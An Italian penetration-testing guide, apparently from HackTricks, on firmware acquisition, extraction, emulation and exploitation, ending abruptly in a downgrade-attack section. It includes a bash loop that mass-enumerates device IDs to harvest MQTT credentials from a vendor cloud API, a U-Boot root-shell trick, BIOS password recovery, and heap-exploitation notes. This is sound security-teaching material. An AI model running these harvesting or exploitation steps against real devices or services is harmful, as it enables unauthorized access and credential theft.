# Analisi del firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introduzione**

### Risorse correlate

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Il firmware è un software essenziale che consente ai dispositivi di funzionare correttamente, gestendo e facilitando la comunicazione tra i componenti hardware e il software con cui interagiscono gli utenti. È archiviato in una memoria permanente, così che il dispositivo possa accedere alle istruzioni fondamentali fin dal momento dell'accensione e avviare il sistema operativo. Esaminare e, potenzialmente, modificare il firmware è un passaggio cruciale per individuare vulnerabilità di sicurezza.<sup>[[2]](#references)[[3]](#references)</sup>

## **Raccolta di informazioni**

La **raccolta di informazioni** è un passaggio iniziale cruciale per comprendere la composizione di un dispositivo e le tecnologie utilizzate. Il processo prevede la raccolta di dati su:

- Architettura della CPU e sistema operativo in uso
- Specifiche del bootloader
- Layout hardware e datasheet
- Metriche della codebase e posizioni del codice sorgente
- Librerie esterne e tipi di licenza
- Cronologia degli aggiornamenti e certificazioni normative
- Diagrammi architetturali e di flusso
- Valutazioni della sicurezza e vulnerabilità individuate

A questo scopo, gli strumenti di **open-source intelligence (OSINT)** sono preziosi, così come l'analisi manuale e automatizzata di qualsiasi componente software open source disponibile. Strumenti come [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) offrono analisi statica gratuite, utili per individuare potenziali problemi.

## **Acquisizione del firmware**

È possibile ottenere il firmware in vari modi, ciascuno con un diverso livello di complessità:

- Direttamente dalla fonte (sviluppatori, produttori)
- Creandolo seguendo le istruzioni fornite
- Scaricandolo dai siti di supporto ufficiali
- Utilizzando query **Google dork** per trovare file firmware ospitati online
- Accedendo direttamente allo **cloud storage**, con strumenti come [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercettando gli **aggiornamenti** con tecniche man-in-the-middle
- **Estraendolo** dal dispositivo tramite connessioni come **UART**, **JTAG** o **PICit**
- **Sniffando** le richieste di aggiornamento nelle comunicazioni del dispositivo
- Individuando e utilizzando endpoint di aggiornamento **hardcoded**
- Eseguendo un **dump** dal bootloader o dalla rete
- **Rimuovendo e leggendo** il chip di memoria, se ogni altro tentativo fallisce, usando strumenti hardware appropriati

### Log solo UART: forzare una root shell tramite l'env di U-Boot nella flash

Se UART RX viene ignorato (solo log), è comunque possibile forzare una shell init **modificando offline il blob dell'ambiente U-Boot**:<sup>[[6]](#references)</sup>

1. Eseguire il dump della SPI flash con una clip SOIC-8 e un programmatore (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Individua la partizione env di U-Boot, modifica `bootargs` per includere `init=/bin/sh` e **ricalcola il CRC32 dell'env U-Boot** per il blob.
3. Riflash solo la partizione env e riavvia; dovrebbe apparire una shell su UART.

È utile sui dispositivi embedded in cui la shell del bootloader è disabilitata, ma la partizione env è scrivibile tramite accesso esterno alla flash.

## Analisi del firmware

Ora che **hai il firmware**, devi estrarne informazioni per capire come procedere. Ecco alcuni strumenti che puoi usare:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Se non trovi molto con questi strumenti, controlla l'**entropia** dell'immagine con `binwalk -E <bin>`: se è bassa, probabilmente non è crittografata. Se è alta, probabilmente è crittografata (o compressa in qualche modo).

Inoltre, puoi usare questi strumenti per estrarre **file incorporati nel firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oppure [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) per ispezionare il file.

### Analisi differenziale della flash e archivi segreti XOR recuperabili

Quando un'impostazione del firmware non ha un formato di memorizzazione documentato, acquisisci innanzitutto diverse letture della flash corrispondenti, modifica **esattamente una** impostazione, esegui di nuovo il dump dell'intero chip e confronta gli offset. Ripetere l'esperimento con valori controllati consente di distinguere l'impostazione dai contatori e dai metadati di scrittura; le modifiche a nuovi offset anziché sul posto indicano un archivio append-only o strutturato come un log. Conserva le voci eliminate o contrassegnate come eliminate, perché i byte del loro payload potrebbero essere ancora recuperabili.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Dopo aver individuato la regione, estrai i moduli del firmware con strumenti come `binwalk` e analizza con reverse engineering il writer/validator in Ghidra. Verifica nel codice i limiti dei campi, il padding, l’indicizzazione delle chiavi e la derivazione delle chiavi, invece di dedurre lo schema solo dai pattern del ciphertext.<sup>[[10]](#references)</sup>

#### Recuperare le chiavi dal padding di zeri cifrato

Come descritto in [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), il known plaintext rivela i byte del keystream agli stessi offset. Un campo di dimensione fissa è particolarmente esposto quando il suo padding di zeri copre ogni indice di una chiave XOR ripetuta: il padding cifrato rivela direttamente quei byte della chiave, perché `0x00 XOR key_byte = key_byte`. Se sono coperti tutti gli indici della chiave, ricostruiscila a partire dalla parte finale del ciphertext e decifra i byte valorizzati.<sup>[[10]](#references)</sup>

Il formato DVAR per le password del BIOS vulnerabile di Dell è un esempio concreto: il byte `0` di un campo di 32 byte è in chiaro, mentre i byte `1..31` usano una chiave ripetuta di 20 byte.<sup>[[10]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Per una lunghezza della password `L`, le posizioni da `L` a `31` erano zero prima dell’operazione XOR. Quando `L <= 12`, queste posizioni coprono tutti gli indici della chiave, quindi è possibile recuperare la chiave completa e la password senza brute force:<sup>[[10]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Ricavare le chiavi dai record storici

Non analizzare ogni record in modo indipendente. La chiave DVAR è derivata approssimativamente come `modified_md5(device_seed || variable_GUID || password[0])`: il seed del dispositivo e il GUID sono fissi, mentre l’unico input dipendente dalla password è il primo byte in chiaro. Questo produce al massimo 256 chiavi per dispositivo e fa sì che i record che iniziano con lo stesso byte condividano una chiave. Raggruppa i record attivi e quelli eliminati in base a quel byte; un record storico breve può rivelare la chiave completa tramite il padding e consentire di decifrare un record corrente più lungo, il cui padding da solo non sarebbe sufficiente. La rotazione delle password può quindi aumentare l’esposizione quando i vecchi ciphertext vengono contrassegnati come eliminati invece di essere cancellati.<sup>[[10]](#references)</sup>

Lo strumento [`dellpwn`](https://github.com/R3n5k1/dellpwn) individua DVAR, convalida i record candidati, recupera le password e può mostrare i byte grezzi memorizzati e quelli della chiave. Compilalo da una copia del repository e analizza un’immagine flash verificata come segue:<sup>[[11]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Per i parser personalizzati, rifiuta i falsi positivi usando la struttura dei record, i vincoli sui caratteri stampabili, i controlli dello zero-padding, l’entropia della chiave e la coerenza nei punti in cui la chiave si ripete. Se dump ripetuti mostrano pochi bit flip per scrittura, elenca le maschere osservate e ordina le correzioni in base a questi vincoli, ma segnala i caratteri ambigui invece di presentare un risultato euristico come recupero esatto.<sup>[[10]](#references)</sup>

I verificatori delle password dovrebbero memorizzare un hash one-way salato e iterato, anziché ciphertext reversibile, e gli archivi log-structured dovrebbero rimuovere in modo sicuro il materiale segreto obsoleto.<sup>[[10]](#references)</sup>

### Recuperare il filesystem

Con i precedenti strumenti commentati, come `binwalk -ev <bin>`, dovresti essere riuscito a **estrarre il filesystem**.\
Binwalk di solito lo estrae in una **cartella denominata in base al tipo di filesystem**, che in genere è uno dei seguenti: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Estrazione manuale del filesystem

A volte binwalk **non ha il magic byte del filesystem tra le proprie firme**. In questi casi, usa binwalk per **trovare l’offset del filesystem e ritagliare il filesystem compresso** dal binario, quindi **estrai manualmente** il filesystem in base al suo tipo, seguendo i passaggi riportati di seguito.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Esegui il seguente **dd command** per effettuare il carving del filesystem Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

In alternativa, è possibile eseguire anche il seguente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Per squashfs (usato nell'esempio precedente)

`$ unsquashfs dir.squashfs`

I file si troveranno successivamente nella directory "`squashfs-root`".

- File di archivio CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Per filesystem jffs2

`$ jefferson rootfsfile.jffs2`

- Per filesystem ubifs con flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisi del firmware

Una volta ottenuto il firmware, è essenziale esaminarlo per comprenderne la struttura e le potenziali vulnerabilità. Questo processo prevede l'utilizzo di vari strumenti per analizzare ed estrarre dati utili dall'immagine del firmware.

### Strumenti di analisi iniziale

Viene fornito un insieme di comandi per l'ispezione iniziale del file binario (indicato come `<bin>`). Questi comandi aiutano a identificare i tipi di file, estrarre stringhe, analizzare i dati binari e comprendere i dettagli delle partizioni e del filesystem:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Per valutare lo stato della cifratura dell'immagine, si controlla l'**entropia** con `binwalk -E <bin>`. Una bassa entropia suggerisce l'assenza di cifratura, mentre un'alta entropia indica una possibile cifratura o compressione.

Per estrarre **file incorporati**, si consigliano strumenti e risorse come la documentazione **file-data-carving-recovery-tools** e **binvis.io** per l'ispezione dei file.

### Estrazione del filesystem

Con `binwalk -ev <bin>`, di solito è possibile estrarre il filesystem, spesso in una directory il cui nome corrisponde al tipo di filesystem (ad esempio, squashfs, ubifs). Tuttavia, quando **binwalk** non riesce a riconoscere il tipo di filesystem a causa di magic bytes mancanti, è necessario procedere all'estrazione manualmente. Per farlo, si usa `binwalk` per individuare l'offset del filesystem, quindi il comando `dd` per estrarlo:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Successivamente, a seconda del tipo di filesystem (ad es. squashfs, cpio, jffs2, ubifs), si usano comandi diversi per estrarne manualmente i contenuti.

### Analisi del filesystem

Una volta estratto il filesystem, inizia la ricerca di falle di sicurezza. Si presta attenzione ai demoni di rete insicuri, alle credenziali hardcoded, agli endpoint API, alle funzionalità del server di aggiornamento, al codice non compilato, agli script di avvio e ai binari compilati da analizzare offline.

Tra i **percorsi** e gli **elementi chiave** da esaminare ci sono:

- **etc/shadow** e **etc/passwd** per le credenziali degli utenti
- Certificati e chiavi SSL in **etc/ssl**
- File di configurazione e script per individuare potenziali vulnerabilità
- Binari embedded da analizzare ulteriormente
- Server web e binari comuni dei dispositivi IoT

Diversi strumenti aiutano a individuare informazioni sensibili e vulnerabilità nel filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) per cercare informazioni sensibili
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) per un'analisi completa del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) e [**EMBA**](https://github.com/e-m-b-a/emba) per l'analisi statica e dinamica

### Controlli di sicurezza sui binari compilati

È necessario esaminare attentamente sia il codice sorgente sia i binari compilati presenti nel filesystem per individuare eventuali vulnerabilità. Strumenti come **checksec.sh** per i binari Unix e **PESecurity** per quelli Windows aiutano a identificare i binari non protetti che potrebbero essere sfruttati.

## Raccolta di configurazioni cloud e credenziali MQTT tramite token URL derivati

Molti hub IoT recuperano la configurazione specifica di ciascun dispositivo da un endpoint cloud simile a:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante l'analisi del firmware, potresti scoprire che `<token>` viene derivato localmente dal device ID usando un segreto hardcoded, ad esempio:

- token = MD5( deviceId || STATIC_KEY ) e rappresentato come esadecimale maiuscolo

Questo design permette a chiunque conosca un deviceId e la STATIC_KEY di ricostruire l'URL e scaricare la configurazione cloud, che spesso rivela credenziali MQTT in chiaro e prefissi dei topic.

Procedura pratica:

1) Estrai il deviceId dai log di avvio UART

- Collega un adattatore UART da 3,3 V (TX/RX/GND) e acquisisci i log:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Cerca le righe che stampano il pattern dell'URL di configurazione cloud e l'indirizzo del broker, ad esempio:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Recuperare STATIC_KEY e l’algoritmo del token dal firmware

- Carica i binari in Ghidra/radare2 e cerca il percorso di configurazione ("/pf/") o l’uso di MD5.
- Conferma l’algoritmo (ad es., MD5(deviceId||STATIC_KEY)).
- Deriva il token in Bash e converti il digest in maiuscolo:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Recuperare la configurazione cloud e le credenziali MQTT

- Componi l'URL e scarica il JSON con curl; analizzalo con jq per estrarre i segreti:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Sfrutta MQTT in testo in chiaro e ACL deboli sui topic (se presenti)

- Usa le credenziali recuperate per sottoscrivere i topic di manutenzione e cercare eventi sensibili:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerare gli ID dei dispositivi prevedibili (su larga scala, con autorizzazione)

- Molti ecosistemi incorporano byte OUI/prodotto/tipo del vendor seguiti da un suffisso sequenziale.
- Puoi iterare sugli ID candidati, derivare token e recuperare configurazioni in modo programmatico:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Note
- Ottieni sempre un'autorizzazione esplicita prima di tentare la mass enumeration.
- Quando possibile, preferisci l'emulazione o l'analisi statica per recuperare i segreti senza modificare l'hardware target.

Il processo di emulazione del firmware consente di eseguire la **dynamic analysis** del funzionamento di un dispositivo o di un singolo programma. Questo approccio può presentare difficoltà dovute alle dipendenze dall'hardware o dall'architettura, ma trasferire il root filesystem o specifici binari su un dispositivo con architettura e endianness corrispondenti, come un Raspberry Pi, oppure su una macchina virtuale preconfigurata, può agevolare ulteriori test.

### Emulare singoli binari

Per esaminare singoli programmi, è fondamentale identificare l'endianness e l'architettura della CPU del programma.

#### Esempio con architettura MIPS

Per emulare un binario con architettura MIPS, si può usare il comando:

```bash
file ./squashfs-root/bin/busybox
```

E per installare gli strumenti di emulazione necessari:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Per MIPS (big-endian), si usa `qemu-mips`; per i binari little-endian, invece, si usa `qemu-mipsel`.

#### Emulazione dell'architettura ARM

Per i binari ARM, il processo è simile: per l'emulazione si utilizza l'emulatore `qemu-arm`.

### Emulazione dell'intero sistema

Strumenti come [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) e altri facilitano l'emulazione dell'intero firmware, automatizzando il processo e agevolando l'analisi dinamica.

### Ricostruzione dei filesystem root suddivisi e verificati per l'emulazione

Se il superblocco SquashFS è leggibile, ma gli offset degli inode, delle directory o della tabella dei frammenti risultano impossibili, non modificare subito `unsquashfs`. Analizza il binario di avvio iniziale e riproduci il grafo dei dispositivi a blocchi che crea: i sistemi embedded possono esporre una partizione root nominale, ma creare il filesystem effettivo con una mappatura `dm-linear` che aggiunge settori presi in prestito da un'altra partizione. I controlli basati solo sul superblocco possono andare a buon fine anche quando tutti i blocchi di metadati successivi sono disallineati.<sup>[[9]](#references)</sup>

Riproduci esattamente l'aritmetica del firmware. In particolare, determina se le lunghezze sono espresse in byte, settori da 512 byte o pagine da 4 KiB; riproduci gli shift e le troncature nell'ordine originale; e considera le regioni finali dipendenti dal bank nei layout A/B. Per esempio, `(partition_bytes >> 12) << 3` prima tronca il valore a un confine di 4 KiB e solo dopo esprime il risultato in settori da 512 byte; sostituirlo con `partition_bytes // 512` può spostare di alcuni kilobyte l'estensione aggiunta e corrompere tutte le tabelle SquashFS successive.<sup>[[9]](#references)</sup>

Un flusso di lavoro utile per la convalida è:<sup>[[9]](#references)</sup>

1. Ricava dal binario del verifier/init il dispositivo sorgente, il settore iniziale e la lunghezza di ogni segmento `dm-linear`.
2. Concatena o mappa le estensioni senza alterarne la semantica di allineamento.
3. Se l'estrazione continua a non riuscire, cerca solo in una piccola finestra attorno al confine previsto e richiedi più strutture di metadati valide consecutive, invece di accettare come sufficiente un superblocco plausibile.
4. Esegui `unsquashfs` non modificato sull'immagine ricostruita; l'attraversamento riuscito di tutte le directory e di tutti i frammenti è una prova più solida di `unsquashfs -stat`.

#### Sostituzione controllata dall'analista di dm-verity

Quando l'analista controlla il kernel QEMU, l'initramfs e i dischi virtuali, è possibile avviare una root modificata sostituendo il PID 1 di verifica del vendor con un piccolo init collegato staticamente. Si tratta di una **sostituzione della catena di avvio in laboratorio**, non di una violazione di dm-verity, della sua firma RSA, di Secure Boot o di una chiave sigillata nel TPM.<sup>[[9]](#references)</sup>

L'init sostitutivo dovrebbe riprodurre le parti operative del percorso di avvio originale: montare `devtmpfs`, chiamare `setsid()`, collegare `/dev/console` ai file descriptor 0–2, montare `/proc` e `/sys`, attendere il dispositivo a blocchi fornito, montare in sola lettura la root modificata, scollegare i pseudo-filesystem della vecchia root, spostare il nuovo mount su `/`, eseguire `chroot` ed eseguire con `execve()` l'`/sbin/init` originale del firmware. Scollegare `/dev`, `/proc` e `/sys` **prima di** `MS_MOVE` evita di scollegare accidentalmente i punti di mount appartenenti alla nuova root.<sup>[[9]](#references)</sup>

Mantieni separato lo stato modificabile del dispositivo dalla root immutabile modificata. Un overlay qcow2 può conservare lo stato LVM del disco originale, mentre un secondo disco virtio in sola lettura fornisce lo SquashFS modificato:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debugging offline dello stato dell’immagine

Esamina lo stato persistente al di fuori del guest quando avvii lenti, script di avvio distruttivi o log della console inaffidabili rendono difficile individuare il problema. Non collegare mai un overlay in uso da una VM attiva; esponilo con `qemu-nbd`, limita il rilevamento LVM alla partizione NBD prevista e disattiva il volume group prima di disconnetterlo.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Per un'isolazione dei guasti ripetibile, scrivi file marker con timestamp su un volume scrivibile stabile e verificali offline; `/dev/kmsg`, FIFO e console temporanee possono causare falsi negativi a causa del rate limiting o della terminazione prematura dei processi. Inoltre, confronta le interfacce esatte tra i vari livelli prima di modificare codice non correlato: `uname -r` rispetto a `/lib/modules/`, le funzionalità ext4 presenti sul disco rispetto alla configurazione del kernel e la generazione di `libGL` di Mesa rispetto all'ABI del driver DRI e ai nomi dei driver ricavati dal PCI. Un componente può esistere e persino caricarsi correttamente con `dlopen()`, ma restare inutilizzabile perché il consumer si aspetta un'ABI diversa.<sup>[[9]](#references)</sup>

## Analisi dinamica nella pratica

In questa fase, per l'analisi si usa un ambiente con un dispositivo reale o emulato. È essenziale mantenere l'accesso alla shell del sistema operativo e al filesystem. L'emulazione potrebbe non riprodurre perfettamente le interazioni hardware, rendendo necessari occasionali riavvii dell'emulatore. L'analisi dovrebbe esaminare nuovamente il filesystem, sfruttare le pagine web e i servizi di rete esposti ed esplorare le vulnerabilità del bootloader. I test d'integrità del firmware sono fondamentali per identificare potenziali vulnerabilità backdoor.

## Tecniche di analisi runtime

L'analisi runtime consiste nell'interagire con un processo o un binario nel suo ambiente operativo, usando strumenti come gdb-multiarch, Frida e Ghidra per impostare breakpoint e individuare vulnerabilità tramite fuzzing e altre tecniche.

Per i target embedded senza un debugger completo, **copia un `gdbserver` collegato staticamente** sul dispositivo e collegati da remoto:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mappatura dei messaggi Zigbee / radio-co-processor

Negli hub IoT, lo stack RF è spesso suddiviso tra un **radio MCU** e un processo userland Linux. Un workflow utile consiste nel mappare il percorso:<sup>[[8]](#references)</sup>

1. **Frame RF** trasmesso via radio
2. **Parser lato controller** sul radio MCU
3. **Protocollo testuale seriale/UART o TLV** inoltrato a Linux (ad esempio `/dev/tty*`)
4. **Dispatcher dell'applicazione** nel daemon principale
5. **Handler specifico del protocollo / macchina a stati**

Questa architettura crea due target per il reverse engineering anziché uno. Se il controller converte i frame radio binari in un protocollo testuale come `Group,Command,arg1,arg2,...`, ricostruisci:

- I **gruppi di messaggi** e le tabelle di dispatch
- Quali messaggi possono provenire dalla **rete** e quali dal controller stesso
- Gli esatti **campi discriminanti specifici del produttore** (ad esempio Zigbee `manufacturer_code` e `cluster_command` personalizzati)
- Gli handler raggiungibili solo durante le fasi di **commissioning**, discovery o download di firmware/modelli

Per Zigbee in particolare, acquisisci il traffico di pairing e verifica se il target usa ancora la **Link Key** predefinita `ZigBeeAlliance09`. In tal caso, intercettare il traffico di commissioning potrebbe esporre la **Network Key**. Gli install code di Zigbee 3.0 riducono questa esposizione: verifica quindi se il dispositivo testato li applica davvero.

### Handler di protocollo specifici del produttore e raggiungibilità vincolata dalla FSM

I comandi Zigbee/ZCL specifici del produttore sono spesso un target migliore dei cluster standardizzati, perché alimentano **codice di parsing personalizzato** e **FSM** interne con validazioni meno collaudate.<sup>[[8]](#references)</sup>

Workflow pratico:

- Analizza il dispatcher dei comandi fino a trovare l'**handler riservato al produttore**.
- Ricostruisci le tabelle di **stato**, **evento**, **controllo**, **azione** e **stato successivo** della FSM.
- Individua gli **stati transitori** che avanzano automaticamente e i rami di retry/errore che finiscono per resettare o liberare lo stato controllato dall'attaccante.
- Verifica quali scambi di protocollo legittimi sono necessari per portare il daemon nello stato vulnerabile, anziché presumere che l'handler vulnerabile sia sempre raggiungibile.

Per i protocolli sensibili ai tempi, il replay dei pacchetti da un framework Python potrebbe essere troppo lento. Un approccio più affidabile consiste nell'emulare un dispositivo legittimo su hardware reale (ad esempio un **nRF52840**) con uno stack di livello professionale del produttore, così da esporre gli **endpoint**, gli **attributi** e i tempi di commissioning corretti.

### Classe di bug nei download frammentati nei daemon embedded

Una classe ricorrente di bug del firmware si presenta nei download frammentati di blob/modelli/configurazioni:<sup>[[8]](#references)</sup>

1. Il **primo frammento** (`offset == 0`) memorizza `ctx->total_size` e alloca `malloc(total_size)`.
2. I frammenti successivi convalidano solo i campi **locali al pacchetto** controllati dall'attaccante, come `packet_total_size >= offset + chunk_len`.
3. La copia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` senza verificare che rientri nella **dimensione allocata originariamente**.

Questo permette all'attaccante di inviare:

- Un primo frammento valido con una dimensione totale dichiarata **piccola**, per forzare una piccola allocazione heap.
- Un frammento successivo con l'**offset previsto** ma un `chunk_len` maggiore.
- Una dimensione locale al pacchetto contraffatta, che supera i nuovi controlli ma causa comunque un overflow del buffer allocato originariamente.

Quando il percorso vulnerabile è dietro la logica di commissioning, lo sfruttamento deve includere sufficiente **emulazione del dispositivo** per portare il target nello stato previsto di download del modello o del blob prima di inviare i frammenti malformati.

### Trigger di `free()` guidati dal protocollo

Nei daemon embedded, spesso il modo più semplice per attivare lo sfruttamento dei metadati heap non è «aspettare la pulizia», ma **forzare la gestione degli errori prevista dal protocollo**:<sup>[[8]](#references)</sup>

- Invia frammenti successivi malformati per portare la FSM negli stati di **retry** o **errore**.
- Supera la soglia di retry, così il daemon **resetta il contesto** e libera il buffer corrotto.
- Sfrutta questo `free()` prevedibile per attivare primitive lato allocator prima che il processo si arresti per motivi non correlati.

Questo è particolarmente utile contro allocator **simili a musl/uClibc/dlmalloc** in Linux embedded, dove la corruzione dei metadati dei chunk può trasformare la logica unlink/unbin in una primitiva di scrittura. Una tecnica stabile consiste nel corrompere un **campo size** per reindirizzare la traversata dell'allocator verso **fake chunk predisposti nel buffer soggetto a overflow**, invece di sovrascrivere subito puntatori reali delle bin e mandare in crash il processo.

## Binary Exploitation e Proof-of-Concept

Sviluppare un PoC per le vulnerabilità individuate richiede una conoscenza approfondita dell'architettura target e la capacità di programmare in linguaggi di basso livello. Le protezioni runtime dei binari nei sistemi embedded sono rare, ma quando sono presenti potrebbero essere necessarie tecniche come Return Oriented Programming (ROP).

### Note sullo sfruttamento dei fastbin di uClibc (Linux embedded)

- **Fastbin + consolidamento:** uClibc usa fastbin simili a quelli di glibc. Una successiva allocazione di grandi dimensioni può attivare `__malloc_consolidate()`, quindi ogni fake chunk deve superare i controlli (dimensione valida, `fd = 0` e chunk adiacenti considerati «in uso»).<sup>[[6]](#references)</sup>
- **Binari non-PIE con ASLR:** se ASLR è abilitato ma il binario principale è **non-PIE**, gli indirizzi `.data/.bss` all'interno del binario sono stabili. È possibile puntare a una regione che assomiglia già a un header valido di heap chunk per far ricadere un'allocazione fastbin su una **tabella di puntatori a funzione**.
- **NUL che interrompe il parser:** quando viene analizzato JSON, un `\x00` nel payload può interrompere il parsing lasciando però i byte successivi controllati dall'attaccante, utilizzabili per uno stack pivot/una catena ROP.
- **Shellcode tramite `/proc/self/mem`:** una catena ROP che chiama `open("/proc/self/mem")`, `lseek()` e `write()` può inserire shellcode eseguibile in una mappatura nota e passarvi l'esecuzione.

## Sistemi operativi preconfigurati per l'analisi del firmware

Sistemi operativi come [AttifyOS](https://github.com/adi0x90/attifyos) ed [EmbedOS](https://github.com/scriptingxss/EmbedOS) forniscono ambienti preconfigurati per i test di sicurezza del firmware, dotati degli strumenti necessari.

## Sistemi operativi preconfigurati per analizzare il firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS è una distro pensata per aiutarti a eseguire valutazioni di sicurezza e pentesting di dispositivi Internet of Things (IoT). Ti fa risparmiare molto tempo fornendo un ambiente preconfigurato con tutti gli strumenti necessari già installati.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operativo per i test di sicurezza embedded basato su Ubuntu 18.04 e preinstallato con strumenti per i test di sicurezza del firmware.

## Attacchi di downgrade del firmware e meccanismi di aggiornamento insicuri

Anche quando un produttore implementa controlli crittografici della firma delle immagini firmware, spesso **omette la protezione dal rollback di versione (downgrade)**. Quando il bootloader o il loader di recovery verifica solo la firma con una chiave pubblica incorporata, senza confrontare la *versione* (o un contatore monotono) dell'immagine da installare, un attaccante può installare legittimamente un **firmware più vecchio e vulnerabile, che ha comunque una firma valida**, reintroducendo così vulnerabilità già corrette.<sup>[[4]](#references)</sup>

Workflow tipico dell'attacco:

1. **Ottieni un'immagine firmata più vecchia**
   * Scaricala dal portale pubblico di download, dalla CDN o dal sito di supporto del produttore.
   * Estraila dalle applicazioni mobile/desktop complementari (ad esempio da `assets/firmware/` dentro un APK Android).
   * Recuperala da repository di terze parti come VirusTotal, archivi Internet, forum ecc.
